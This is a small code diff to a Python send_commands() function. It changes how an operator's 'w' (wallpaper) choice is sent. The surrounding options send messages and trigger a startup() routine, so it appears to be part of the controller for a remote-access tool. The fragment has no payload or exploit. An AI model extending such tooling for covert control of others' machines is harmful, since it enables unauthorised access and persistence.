@@ -457,8 +457,8 @@ def send_commands():
             elif strChoice[:1] == "m" and len(strChoice) > 1:
                 strMsg = "msg" + strChoice[2:]
                 send(strMsg.encode())
-            elif strChoice[:1] == "w" and len(strChoice) > 1:
-                strMsg = "wallpaper" + strChoice[2:]
+            elif strChoice == "w":
+                strMsg = "wallpaper"
                 send(strMsg.encode())
             elif strChoice == "a 1":
                 startup()
